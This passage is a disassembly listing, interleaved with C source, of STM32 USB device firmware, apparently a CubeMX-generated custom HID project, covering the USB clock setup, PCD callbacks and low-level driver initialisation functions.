 800c9ca:	2300      	movs	r3, #0
  /* USER CODE END 8 */
}
 800c9cc:	4618      	mov	r0, r3
 800c9ce:	46bd      	mov	sp, r7
 800c9d0:	f85d 7b04 	ldr.w	r7, [sp], #4
 800c9d4:	4770      	bx	lr
	...

0800c9d8 <HAL_PCD_MspInit>:
                       LL Driver Callbacks (PCD -> USB Device Library)
*******************************************************************************/
/* MSP Init */

void HAL_PCD_MspInit(PCD_HandleTypeDef* pcdHandle)
{
 800c9d8:	b580      	push	{r7, lr}
 800c9da:	b098      	sub	sp, #96	; 0x60
 800c9dc:	af00      	add	r7, sp, #0
 800c9de:	6078      	str	r0, [r7, #4]
  RCC_PeriphCLKInitTypeDef PeriphClkInit = {0};
 800c9e0:	f107 030c 	add.w	r3, r7, #12
 800c9e4:	2254      	movs	r2, #84	; 0x54
 800c9e6:	2100      	movs	r1, #0
 800c9e8:	4618      	mov	r0, r3
 800c9ea:	f000 fbd5 	bl	800d198 <memset>
  if(pcdHandle->Instance==USB)
 800c9ee:	687b      	ldr	r3, [r7, #4]
 800c9f0:	681b      	ldr	r3, [r3, #0]
 800c9f2:	4a1d      	ldr	r2, [pc, #116]	; (800ca68 <HAL_PCD_MspInit+0x90>)
 800c9f4:	4293      	cmp	r3, r2
 800c9f6:	d132      	bne.n	800ca5e <HAL_PCD_MspInit+0x86>

  /* USER CODE END USB_MspInit 0 */

  /** Initializes the peripherals clock
  */
    PeriphClkInit.PeriphClockSelection = RCC_PERIPHCLK_USB;
 800c9f8:	f44f 5300 	mov.w	r3, #8192	; 0x2000
 800c9fc:	60fb      	str	r3, [r7, #12]
    PeriphClkInit.UsbClockSelection = RCC_USBCLKSOURCE_PLLSAI1;
 800c9fe:	f04f 6380 	mov.w	r3, #67108864	; 0x4000000
 800ca02:	64fb      	str	r3, [r7, #76]	; 0x4c
    PeriphClkInit.PLLSAI1.PLLSAI1Source = RCC_PLLSOURCE_MSI;
 800ca04:	2301      	movs	r3, #1
 800ca06:	613b      	str	r3, [r7, #16]
    PeriphClkInit.PLLSAI1.PLLSAI1M = 1;
 800ca08:	2301      	movs	r3, #1
 800ca0a:	617b      	str	r3, [r7, #20]
    PeriphClkInit.PLLSAI1.PLLSAI1N = 24;
 800ca0c:	2318      	movs	r3, #24
 800ca0e:	61bb      	str	r3, [r7, #24]
    PeriphClkInit.PLLSAI1.PLLSAI1P = RCC_PLLP_DIV7;
 800ca10:	2307      	movs	r3, #7
 800ca12:	61fb      	str	r3, [r7, #28]
    PeriphClkInit.PLLSAI1.PLLSAI1Q = RCC_PLLQ_DIV2;
 800ca14:	2302      	movs	r3, #2
 800ca16:	623b      	str	r3, [r7, #32]
    PeriphClkInit.PLLSAI1.PLLSAI1R = RCC_PLLR_DIV2;
 800ca18:	2302      	movs	r3, #2
 800ca1a:	627b      	str	r3, [r7, #36]	; 0x24
    PeriphClkInit.PLLSAI1.PLLSAI1ClockOut = RCC_PLLSAI1_48M2CLK;
 800ca1c:	f44f 1380 	mov.w	r3, #1048576	; 0x100000
 800ca20:	62bb      	str	r3, [r7, #40]	; 0x28
    if (HAL_RCCEx_PeriphCLKConfig(&PeriphClkInit) != HAL_OK)
 800ca22:	f107 030c 	add.w	r3, r7, #12
 800ca26:	4618      	mov	r0, r3
 800ca28:	f7f7 fe5c 	bl	80046e4 <HAL_RCCEx_PeriphCLKConfig>
 800ca2c:	4603      	mov	r3, r0
 800ca2e:	2b00      	cmp	r3, #0
 800ca30:	d001      	beq.n	800ca36 <HAL_PCD_MspInit+0x5e>
    {
      Error_Handler();
 800ca32:	f7f4 fa03 	bl	8000e3c <Error_Handler>
    }

    /* Peripheral clock enable */
    __HAL_RCC_USB_CLK_ENABLE();
 800ca36:	4b0d      	ldr	r3, [pc, #52]	; (800ca6c <HAL_PCD_MspInit+0x94>)
 800ca38:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 800ca3a:	4a0c      	ldr	r2, [pc, #48]	; (800ca6c <HAL_PCD_MspInit+0x94>)
 800ca3c:	f043 6380 	orr.w	r3, r3, #67108864	; 0x4000000
 800ca40:	6593      	str	r3, [r2, #88]	; 0x58
 800ca42:	4b0a      	ldr	r3, [pc, #40]	; (800ca6c <HAL_PCD_MspInit+0x94>)
 800ca44:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 800ca46:	f003 6380 	and.w	r3, r3, #67108864	; 0x4000000
 800ca4a:	60bb      	str	r3, [r7, #8]
 800ca4c:	68bb      	ldr	r3, [r7, #8]

    /* Peripheral interrupt init */
    HAL_NVIC_SetPriority(USB_IRQn, 0, 0);
 800ca4e:	2200      	movs	r2, #0
 800ca50:	2100      	movs	r1, #0
 800ca52:	2043      	movs	r0, #67	; 0x43
 800ca54:	f7f4 fd95 	bl	8001582 <HAL_NVIC_SetPriority>
    HAL_NVIC_EnableIRQ(USB_IRQn);
 800ca58:	2043      	movs	r0, #67	; 0x43
 800ca5a:	f7f4 fdae 	bl	80015ba <HAL_NVIC_EnableIRQ>
  /* USER CODE BEGIN USB_MspInit 1 */

  /* USER CODE END USB_MspInit 1 */
  }
}
 800ca5e:	bf00      	nop
 800ca60:	3760      	adds	r7, #96	; 0x60
 800ca62:	46bd      	mov	sp, r7
 800ca64:	bd80      	pop	{r7, pc}
 800ca66:	bf00      	nop
 800ca68:	40006800 	.word	0x40006800
 800ca6c:	40021000 	.word	0x40021000

0800ca70 <HAL_PCD_SetupStageCallback>:
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_SetupStageCallback(PCD_HandleTypeDef *hpcd)
#else
void HAL_PCD_SetupStageCallback(PCD_HandleTypeDef *hpcd)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
 800ca70:	b580      	push	{r7, lr}
 800ca72:	b082      	sub	sp, #8
 800ca74:	af00      	add	r7, sp, #0
 800ca76:	6078      	str	r0, [r7, #4]
  USBD_LL_SetupStage((USBD_HandleTypeDef*)hpcd->pData, (uint8_t *)hpcd->Setup);
 800ca78:	687b      	ldr	r3, [r7, #4]
 800ca7a:	f8d3 22f4 	ldr.w	r2, [r3, #756]	; 0x2f4
 800ca7e:	687b      	ldr	r3, [r7, #4]
 800ca80:	f503 732c 	add.w	r3, r3, #688	; 0x2b0
 800ca84:	4619      	mov	r1, r3
 800ca86:	4610      	mov	r0, r2
 800ca88:	f7fe fb70 	bl	800b16c <USBD_LL_SetupStage>
}
 800ca8c:	bf00      	nop
 800ca8e:	3708      	adds	r7, #8
 800ca90:	46bd      	mov	sp, r7
 800ca92:	bd80      	pop	{r7, pc}

0800ca94 <HAL_PCD_DataOutStageCallback>:
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_DataOutStageCallback(PCD_HandleTypeDef *hpcd, uint8_t epnum)
#else
void HAL_PCD_DataOutStageCallback(PCD_HandleTypeDef *hpcd, uint8_t epnum)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
 800ca94:	b580      	push	{r7, lr}
 800ca96:	b082      	sub	sp, #8
 800ca98:	af00      	add	r7, sp, #0
 800ca9a:	6078      	str	r0, [r7, #4]
 800ca9c:	460b      	mov	r3, r1
 800ca9e:	70fb      	strb	r3, [r7, #3]
  USBD_LL_DataOutStage((USBD_HandleTypeDef*)hpcd->pData, epnum, hpcd->OUT_ep[epnum].xfer_buff);
 800caa0:	687b      	ldr	r3, [r7, #4]
 800caa2:	f8d3 02f4 	ldr.w	r0, [r3, #756]	; 0x2f4
 800caa6:	78fa      	ldrb	r2, [r7, #3]
 800caa8:	6879      	ldr	r1, [r7, #4]
 800caaa:	4613      	mov	r3, r2
 800caac:	009b      	lsls	r3, r3, #2
 800caae:	4413      	add	r3, r2
 800cab0:	00db      	lsls	r3, r3, #3
 800cab2:	440b      	add	r3, r1
 800cab4:	f503 73be 	add.w	r3, r3, #380	; 0x17c
 800cab8:	681a      	ldr	r2, [r3, #0]
 800caba:	78fb      	ldrb	r3, [r7, #3]
 800cabc:	4619      	mov	r1, r3
 800cabe:	f7fe fbaa 	bl	800b216 <USBD_LL_DataOutStage>
}
 800cac2:	bf00      	nop
 800cac4:	3708      	adds	r7, #8
 800cac6:	46bd      	mov	sp, r7
 800cac8:	bd80      	pop	{r7, pc}

0800caca <HAL_PCD_DataInStageCallback>:
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_DataInStageCallback(PCD_HandleTypeDef *hpcd, uint8_t epnum)
#else
void HAL_PCD_DataInStageCallback(PCD_HandleTypeDef *hpcd, uint8_t epnum)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
 800caca:	b580      	push	{r7, lr}
 800cacc:	b082      	sub	sp, #8
 800cace:	af00      	add	r7, sp, #0
 800cad0:	6078      	str	r0, [r7, #4]
 800cad2:	460b      	mov	r3, r1
 800cad4:	70fb      	strb	r3, [r7, #3]
  USBD_LL_DataInStage((USBD_HandleTypeDef*)hpcd->pData, epnum, hpcd->IN_ep[epnum].xfer_buff);
 800cad6:	687b      	ldr	r3, [r7, #4]
 800cad8:	f8d3 02f4 	ldr.w	r0, [r3, #756]	; 0x2f4
 800cadc:	78fa      	ldrb	r2, [r7, #3]
 800cade:	6879      	ldr	r1, [r7, #4]
 800cae0:	4613      	mov	r3, r2
 800cae2:	009b      	lsls	r3, r3, #2
 800cae4:	4413      	add	r3, r2
 800cae6:	00db      	lsls	r3, r3, #3
 800cae8:	440b      	add	r3, r1
 800caea:	333c      	adds	r3, #60	; 0x3c
 800caec:	681a      	ldr	r2, [r3, #0]
 800caee:	78fb      	ldrb	r3, [r7, #3]
 800caf0:	4619      	mov	r1, r3
 800caf2:	f7fe fc43 	bl	800b37c <USBD_LL_DataInStage>
}
 800caf6:	bf00      	nop
 800caf8:	3708      	adds	r7, #8
 800cafa:	46bd      	mov	sp, r7
 800cafc:	bd80      	pop	{r7, pc}

0800cafe <HAL_PCD_SOFCallback>:
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_SOFCallback(PCD_HandleTypeDef *hpcd)
#else
void HAL_PCD_SOFCallback(PCD_HandleTypeDef *hpcd)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
 800cafe:	b580      	push	{r7, lr}
 800cb00:	b082      	sub	sp, #8
 800cb02:	af00      	add	r7, sp, #0
 800cb04:	6078      	str	r0, [r7, #4]
  USBD_LL_SOF((USBD_HandleTypeDef*)hpcd->pData);
 800cb06:	687b      	ldr	r3, [r7, #4]
 800cb08:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800cb0c:	4618      	mov	r0, r3
 800cb0e:	f7fe fd7d 	bl	800b60c <USBD_LL_SOF>
}
 800cb12:	bf00      	nop
 800cb14:	3708      	adds	r7, #8
 800cb16:	46bd      	mov	sp, r7
 800cb18:	bd80      	pop	{r7, pc}

0800cb1a <HAL_PCD_ResetCallback>:
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_ResetCallback(PCD_HandleTypeDef *hpcd)
#else
void HAL_PCD_ResetCallback(PCD_HandleTypeDef *hpcd)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
 800cb1a:	b580      	push	{r7, lr}
 800cb1c:	b084      	sub	sp, #16
 800cb1e:	af00      	add	r7, sp, #0
 800cb20:	6078      	str	r0, [r7, #4]
  USBD_SpeedTypeDef speed = USBD_SPEED_FULL;
 800cb22:	2301      	movs	r3, #1
 800cb24:	73fb      	strb	r3, [r7, #15]

  if ( hpcd->Init.speed != PCD_SPEED_FULL)
 800cb26:	687b      	ldr	r3, [r7, #4]
 800cb28:	689b      	ldr	r3, [r3, #8]
 800cb2a:	2b02      	cmp	r3, #2
 800cb2c:	d001      	beq.n	800cb32 <HAL_PCD_ResetCallback+0x18>
  {
    Error_Handler();
 800cb2e:	f7f4 f985 	bl	8000e3c <Error_Handler>
  }
    /* Set Speed. */
  USBD_LL_SetSpeed((USBD_HandleTypeDef*)hpcd->pData, speed);
 800cb32:	687b      	ldr	r3, [r7, #4]
 800cb34:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800cb38:	7bfa      	ldrb	r2, [r7, #15]
 800cb3a:	4611      	mov	r1, r2
 800cb3c:	4618      	mov	r0, r3
 800cb3e:	f7fe fd21 	bl	800b584 <USBD_LL_SetSpeed>

  /* Reset Device. */
  USBD_LL_Reset((USBD_HandleTypeDef*)hpcd->pData);
 800cb42:	687b      	ldr	r3, [r7, #4]
 800cb44:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800cb48:	4618      	mov	r0, r3
 800cb4a:	f7fe fcc9 	bl	800b4e0 <USBD_LL_Reset>
}
 800cb4e:	bf00      	nop
 800cb50:	3710      	adds	r7, #16
 800cb52:	46bd      	mov	sp, r7
 800cb54:	bd80      	pop	{r7, pc}
	...

0800cb58 <HAL_PCD_SuspendCallback>:
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_SuspendCallback(PCD_HandleTypeDef *hpcd)
#else
void HAL_PCD_SuspendCallback(PCD_HandleTypeDef *hpcd)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
 800cb58:	b580      	push	{r7, lr}
 800cb5a:	b082      	sub	sp, #8
 800cb5c:	af00      	add	r7, sp, #0
 800cb5e:	6078      	str	r0, [r7, #4]
  /* Inform USB library that core enters in suspend Mode. */
  USBD_LL_Suspend((USBD_HandleTypeDef*)hpcd->pData);
 800cb60:	687b      	ldr	r3, [r7, #4]
 800cb62:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800cb66:	4618      	mov	r0, r3
 800cb68:	f7fe fd1c 	bl	800b5a4 <USBD_LL_Suspend>
  /* Enter in STOP mode. */
  /* USER CODE BEGIN 2 */
  if (hpcd->Init.low_power_enable)
 800cb6c:	687b      	ldr	r3, [r7, #4]
 800cb6e:	699b      	ldr	r3, [r3, #24]
 800cb70:	2b00      	cmp	r3, #0
 800cb72:	d005      	beq.n	800cb80 <HAL_PCD_SuspendCallback+0x28>
  {
    /* Set SLEEPDEEP bit and SleepOnExit of Cortex System Control Register. */
    SCB->SCR |= (uint32_t)((uint32_t)(SCB_SCR_SLEEPDEEP_Msk | SCB_SCR_SLEEPONEXIT_Msk));
 800cb74:	4b04      	ldr	r3, [pc, #16]	; (800cb88 <HAL_PCD_SuspendCallback+0x30>)
 800cb76:	691b      	ldr	r3, [r3, #16]
 800cb78:	4a03      	ldr	r2, [pc, #12]	; (800cb88 <HAL_PCD_SuspendCallback+0x30>)
 800cb7a:	f043 0306 	orr.w	r3, r3, #6
 800cb7e:	6113      	str	r3, [r2, #16]
  }
  /* USER CODE END 2 */
}
 800cb80:	bf00      	nop
 800cb82:	3708      	adds	r7, #8
 800cb84:	46bd      	mov	sp, r7
 800cb86:	bd80      	pop	{r7, pc}
 800cb88:	e000ed00 	.word	0xe000ed00

0800cb8c <HAL_PCD_ResumeCallback>:
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
static void PCD_ResumeCallback(PCD_HandleTypeDef *hpcd)
#else
void HAL_PCD_ResumeCallback(PCD_HandleTypeDef *hpcd)
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
{
 800cb8c:	b580      	push	{r7, lr}
 800cb8e:	b082      	sub	sp, #8
 800cb90:	af00      	add	r7, sp, #0
 800cb92:	6078      	str	r0, [r7, #4]

  /* USER CODE BEGIN 3 */
  if (hpcd->Init.low_power_enable)
 800cb94:	687b      	ldr	r3, [r7, #4]
 800cb96:	699b      	ldr	r3, [r3, #24]
 800cb98:	2b00      	cmp	r3, #0
 800cb9a:	d007      	beq.n	800cbac <HAL_PCD_ResumeCallback+0x20>
  {
    /* Reset SLEEPDEEP bit of Cortex System Control Register. */
    SCB->SCR &= (uint32_t)~((uint32_t)(SCB_SCR_SLEEPDEEP_Msk | SCB_SCR_SLEEPONEXIT_Msk));
 800cb9c:	4b08      	ldr	r3, [pc, #32]	; (800cbc0 <HAL_PCD_ResumeCallback+0x34>)
 800cb9e:	691b      	ldr	r3, [r3, #16]
 800cba0:	4a07      	ldr	r2, [pc, #28]	; (800cbc0 <HAL_PCD_ResumeCallback+0x34>)
 800cba2:	f023 0306 	bic.w	r3, r3, #6
 800cba6:	6113      	str	r3, [r2, #16]
    SystemClockConfig_Resume();
 800cba8:	f000 faf0 	bl	800d18c <SystemClockConfig_Resume>
  }
  /* USER CODE END 3 */
  USBD_LL_Resume((USBD_HandleTypeDef*)hpcd->pData);
 800cbac:	687b      	ldr	r3, [r7, #4]
 800cbae:	f8d3 32f4 	ldr.w	r3, [r3, #756]	; 0x2f4
 800cbb2:	4618      	mov	r0, r3
 800cbb4:	f7fe fd12 	bl	800b5dc <USBD_LL_Resume>
}
 800cbb8:	bf00      	nop
 800cbba:	3708      	adds	r7, #8
 800cbbc:	46bd      	mov	sp, r7
 800cbbe:	bd80      	pop	{r7, pc}
 800cbc0:	e000ed00 	.word	0xe000ed00

0800cbc4 <USBD_LL_Init>:
  * @brief  Initializes the low level portion of the device driver.
  * @param  pdev: Device handle
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_Init(USBD_HandleTypeDef *pdev)
{
 800cbc4:	b580      	push	{r7, lr}
 800cbc6:	b082      	sub	sp, #8
 800cbc8:	af00      	add	r7, sp, #0
 800cbca:	6078      	str	r0, [r7, #4]
  /* Init USB Ip. */
  /* Enable USB power on Pwrctrl CR2 register. */
  HAL_PWREx_EnableVddUSB();
 800cbcc:	f7f6 ff42 	bl	8003a54 <HAL_PWREx_EnableVddUSB>
  /* Link the driver to the stack. */
  hpcd_USB_FS.pData = pdev;
 800cbd0:	4a26      	ldr	r2, [pc, #152]	; (800cc6c <USBD_LL_Init+0xa8>)
 800cbd2:	687b      	ldr	r3, [r7, #4]
 800cbd4:	f8c2 32f4 	str.w	r3, [r2, #756]	; 0x2f4
  pdev->pData = &hpcd_USB_FS;
 800cbd8:	687b      	ldr	r3, [r7, #4]
 800cbda:	4a24      	ldr	r2, [pc, #144]	; (800cc6c <USBD_LL_Init+0xa8>)
 800cbdc:	f8c3 22c8 	str.w	r2, [r3, #712]	; 0x2c8

  hpcd_USB_FS.Instance = USB;
 800cbe0:	4b22      	ldr	r3, [pc, #136]	; (800cc6c <USBD_LL_Init+0xa8>)
 800cbe2:	4a23      	ldr	r2, [pc, #140]	; (800cc70 <USBD_LL_Init+0xac>)
 800cbe4:	601a      	str	r2, [r3, #0]
  hpcd_USB_FS.Init.dev_endpoints = 8;
 800cbe6:	4b21      	ldr	r3, [pc, #132]	; (800cc6c <USBD_LL_Init+0xa8>)
 800cbe8:	2208      	movs	r2, #8
 800cbea:	605a      	str	r2, [r3, #4]
  hpcd_USB_FS.Init.speed = PCD_SPEED_FULL;
 800cbec:	4b1f      	ldr	r3, [pc, #124]	; (800cc6c <USBD_LL_Init+0xa8>)
 800cbee:	2202      	movs	r2, #2
 800cbf0:	609a      	str	r2, [r3, #8]
  hpcd_USB_FS.Init.phy_itface = PCD_PHY_EMBEDDED;
 800cbf2:	4b1e      	ldr	r3, [pc, #120]	; (800cc6c <USBD_LL_Init+0xa8>)
 800cbf4:	2202      	movs	r2, #2
 800cbf6:	611a      	str	r2, [r3, #16]
  hpcd_USB_FS.Init.Sof_enable = DISABLE;
 800cbf8:	4b1c      	ldr	r3, [pc, #112]	; (800cc6c <USBD_LL_Init+0xa8>)
 800cbfa:	2200      	movs	r2, #0
 800cbfc:	615a      	str	r2, [r3, #20]
  hpcd_USB_FS.Init.low_power_enable = DISABLE;
 800cbfe:	4b1b      	ldr	r3, [pc, #108]	; (800cc6c <USBD_LL_Init+0xa8>)
 800cc00:	2200      	movs	r2, #0
 800cc02:	619a      	str	r2, [r3, #24]
  hpcd_USB_FS.Init.lpm_enable = DISABLE;
 800cc04:	4b19      	ldr	r3, [pc, #100]	; (800cc6c <USBD_LL_Init+0xa8>)
 800cc06:	2200      	movs	r2, #0
 800cc08:	61da      	str	r2, [r3, #28]
  hpcd_USB_FS.Init.battery_charging_enable = DISABLE;
 800cc0a:	4b18      	ldr	r3, [pc, #96]	; (800cc6c <USBD_LL_Init+0xa8>)
 800cc0c:	2200      	movs	r2, #0
 800cc0e:	621a      	str	r2, [r3, #32]
  if (HAL_PCD_Init(&hpcd_USB_FS) != HAL_OK)
 800cc10:	4816      	ldr	r0, [pc, #88]	; (800cc6c <USBD_LL_Init+0xa8>)
 800cc12:	f7f5 f8e7 	bl	8001de4 <HAL_PCD_Init>
 800cc16:	4603      	mov	r3, r0
 800cc18:	2b00      	cmp	r3, #0
 800cc1a:	d001      	beq.n	800cc20 <USBD_LL_Init+0x5c>
  {
    Error_Handler( );
 800cc1c:	f7f4 f90e 	bl	8000e3c <Error_Handler>
  HAL_PCD_RegisterDataInStageCallback(&hpcd_USB_FS, PCD_DataInStageCallback);
  HAL_PCD_RegisterIsoOutIncpltCallback(&hpcd_USB_FS, PCD_ISOOUTIncompleteCallback);
  HAL_PCD_RegisterIsoInIncpltCallback(&hpcd_USB_FS, PCD_ISOINIncompleteCallback);
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
  /* USER CODE BEGIN EndPoint_Configuration */
  HAL_PCDEx_PMAConfig((PCD_HandleTypeDef*)pdev->pData , 0x00 , PCD_SNG_BUF, 0x18);
 800cc20:	687b      	ldr	r3, [r7, #4]
 800cc22:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800cc26:	2318      	movs	r3, #24
 800cc28:	2200      	movs	r2, #0
 800cc2a:	2100      	movs	r1, #0
 800cc2c:	f7f6 fe31 	bl	8003892 <HAL_PCDEx_PMAConfig>
  HAL_PCDEx_PMAConfig((PCD_HandleTypeDef*)pdev->pData , 0x80 , PCD_SNG_BUF, 0x58);
 800cc30:	687b      	ldr	r3, [r7, #4]
 800cc32:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800cc36:	2358      	movs	r3, #88	; 0x58
 800cc38:	2200      	movs	r2, #0
 800cc3a:	2180      	movs	r1, #128	; 0x80
 800cc3c:	f7f6 fe29 	bl	8003892 <HAL_PCDEx_PMAConfig>
  /* USER CODE END EndPoint_Configuration */
  /* USER CODE BEGIN EndPoint_Configuration_CUSTOM_HID */
  HAL_PCDEx_PMAConfig((PCD_HandleTypeDef*)pdev->pData , CUSTOM_HID_EPIN_ADDR , PCD_SNG_BUF, 0x98);
 800cc40:	687b      	ldr	r3, [r7, #4]
 800cc42:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800cc46:	2398      	movs	r3, #152	; 0x98
 800cc48:	2200      	movs	r2, #0
 800cc4a:	2181      	movs	r1, #129	; 0x81
 800cc4c:	f7f6 fe21 	bl	8003892 <HAL_PCDEx_PMAConfig>
  HAL_PCDEx_PMAConfig((PCD_HandleTypeDef*)pdev->pData , CUSTOM_HID_EPOUT_ADDR , PCD_SNG_BUF, 0xD8);
 800cc50:	687b      	ldr	r3, [r7, #4]
 800cc52:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800cc56:	23d8      	movs	r3, #216	; 0xd8
 800cc58:	2200      	movs	r2, #0
 800cc5a:	2101      	movs	r1, #1
 800cc5c:	f7f6 fe19 	bl	8003892 <HAL_PCDEx_PMAConfig>
  /* USER CODE END EndPoint_Configuration_CUSTOM_HID */
  return USBD_OK;
 800cc60:	2300      	movs	r3, #0
}
 800cc62:	4618      	mov	r0, r3
 800cc64:	3708      	adds	r7, #8
 800cc66:	46bd      	mov	sp, r7
 800cc68:	bd80      	pop	{r7, pc}
 800cc6a:	bf00      	nop
 800cc6c:	20000b7c 	.word	0x20000b7c
 800cc70:	40006800 	.word	0x40006800

0800cc74 <USBD_LL_Start>:
  * @brief  Starts the low level portion of the device driver.
  * @param  pdev: Device handle
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_Start(USBD_HandleTypeDef *pdev)
{
 800cc74:	b580      	push	{r7, lr}
 800cc76:	b084      	sub	sp, #16
 800cc78:	af00      	add	r7, sp, #0
 800cc7a:	6078      	str	r0, [r7, #4]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800cc7c:	2300      	movs	r3, #0
 800cc7e:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800cc80:	2300      	movs	r3, #0
 800cc82:	73fb      	strb	r3, [r7, #15]

  hal_status = HAL_PCD_Start(pdev->pData);
 800cc84:	687b      	ldr	r3, [r7, #4]
 800cc86:	f8d3 32c8 	ldr.w	r3, [r3, #712]	; 0x2c8
 800cc8a:	4618      	mov	r0, r3
 800cc8c:	f7f5 f9b0 	bl	8001ff0 <HAL_PCD_Start>
 800cc90:	4603      	mov	r3, r0
 800cc92:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800cc94:	7bbb      	ldrb	r3, [r7, #14]
 800cc96:	2b03      	cmp	r3, #3
 800cc98:	d816      	bhi.n	800ccc8 <USBD_LL_Start+0x54>
 800cc9a:	a201      	add	r2, pc, #4	; (adr r2, 800cca0 <USBD_LL_Start+0x2c>)
 800cc9c:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800cca0:	0800ccb1 	.word	0x0800ccb1
 800cca4:	0800ccb7 	.word	0x0800ccb7
 800cca8:	0800ccbd 	.word	0x0800ccbd
 800ccac:	0800ccc3 	.word	0x0800ccc3
    case HAL_OK :
      usb_status = USBD_OK;
 800ccb0:	2300      	movs	r3, #0
 800ccb2:	73fb      	strb	r3, [r7, #15]
    break;
 800ccb4:	e00b      	b.n	800ccce <USBD_LL_Start+0x5a>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800ccb6:	2303      	movs	r3, #3
 800ccb8:	73fb      	strb	r3, [r7, #15]
    break;
 800ccba:	e008      	b.n	800ccce <USBD_LL_Start+0x5a>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800ccbc:	2301      	movs	r3, #1
 800ccbe:	73fb      	strb	r3, [r7, #15]
    break;
 800ccc0:	e005      	b.n	800ccce <USBD_LL_Start+0x5a>
    case HAL_TIMEOUT :
      usb_status = USBD_FAIL;
 800ccc2:	2303      	movs	r3, #3
 800ccc4:	73fb      	strb	r3, [r7, #15]
    break;
 800ccc6:	e002      	b.n	800ccce <USBD_LL_Start+0x5a>
    default :
      usb_status = USBD_FAIL;
 800ccc8:	2303      	movs	r3, #3
 800ccca:	73fb      	strb	r3, [r7, #15]
    break;
 800cccc:	bf00      	nop
  }
  return usb_status;
 800ccce:	7bfb      	ldrb	r3, [r7, #15]
}
 800ccd0:	4618      	mov	r0, r3
 800ccd2:	3710      	adds	r7, #16
 800ccd4:	46bd      	mov	sp, r7
 800ccd6:	bd80      	pop	{r7, pc}

0800ccd8 <USBD_LL_OpenEP>:
  * @param  ep_type: Endpoint type
  * @param  ep_mps: Endpoint max packet size
  * @retval USBD status
  */
USBD_StatusTypeDef USBD_LL_OpenEP(USBD_HandleTypeDef *pdev, uint8_t ep_addr, uint8_t ep_type, uint16_t ep_mps)
{
 800ccd8:	b580      	push	{r7, lr}
 800ccda:	b084      	sub	sp, #16
 800ccdc:	af00      	add	r7, sp, #0
 800ccde:	6078      	str	r0, [r7, #4]
 800cce0:	4608      	mov	r0, r1
 800cce2:	4611      	mov	r1, r2
 800cce4:	461a      	mov	r2, r3
 800cce6:	4603      	mov	r3, r0
 800cce8:	70fb      	strb	r3, [r7, #3]
 800ccea:	460b      	mov	r3, r1
 800ccec:	70bb      	strb	r3, [r7, #2]
 800ccee:	4613      	mov	r3, r2
 800ccf0:	803b      	strh	r3, [r7, #0]
  HAL_StatusTypeDef hal_status = HAL_OK;
 800ccf2:	2300      	movs	r3, #0
 800ccf4:	73bb      	strb	r3, [r7, #14]
  USBD_StatusTypeDef usb_status = USBD_OK;
 800ccf6:	2300      	movs	r3, #0
 800ccf8:	73fb      	strb	r3, [r7, #15]

  hal_status = HAL_PCD_EP_Open(pdev->pData, ep_addr, ep_mps, ep_type);
 800ccfa:	687b      	ldr	r3, [r7, #4]
 800ccfc:	f8d3 02c8 	ldr.w	r0, [r3, #712]	; 0x2c8
 800cd00:	78bb      	ldrb	r3, [r7, #2]
 800cd02:	883a      	ldrh	r2, [r7, #0]
 800cd04:	78f9      	ldrb	r1, [r7, #3]
 800cd06:	f7f5 fae1 	bl	80022cc <HAL_PCD_EP_Open>
 800cd0a:	4603      	mov	r3, r0
 800cd0c:	73bb      	strb	r3, [r7, #14]

  switch (hal_status) {
 800cd0e:	7bbb      	ldrb	r3, [r7, #14]
 800cd10:	2b03      	cmp	r3, #3
 800cd12:	d817      	bhi.n	800cd44 <USBD_LL_OpenEP+0x6c>
 800cd14:	a201      	add	r2, pc, #4	; (adr r2, 800cd1c <USBD_LL_OpenEP+0x44>)
 800cd16:	f852 f023 	ldr.w	pc, [r2, r3, lsl #2]
 800cd1a:	bf00      	nop
 800cd1c:	0800cd2d 	.word	0x0800cd2d
 800cd20:	0800cd33 	.word	0x0800cd33
 800cd24:	0800cd39 	.word	0x0800cd39
 800cd28:	0800cd3f 	.word	0x0800cd3f
    case HAL_OK :
      usb_status = USBD_OK;
 800cd2c:	2300      	movs	r3, #0
 800cd2e:	73fb      	strb	r3, [r7, #15]
    break;
 800cd30:	e00b      	b.n	800cd4a <USBD_LL_OpenEP+0x72>
    case HAL_ERROR :
      usb_status = USBD_FAIL;
 800cd32:	2303      	movs	r3, #3
 800cd34:	73fb      	strb	r3, [r7, #15]
    break;
 800cd36:	e008      	b.n	800cd4a <USBD_LL_OpenEP+0x72>
    case HAL_BUSY :
      usb_status = USBD_BUSY;
 800cd38:	2301      	movs	r3, #1
 800cd3a:	73fb      	strb	r3, [r7, #15]
    break;
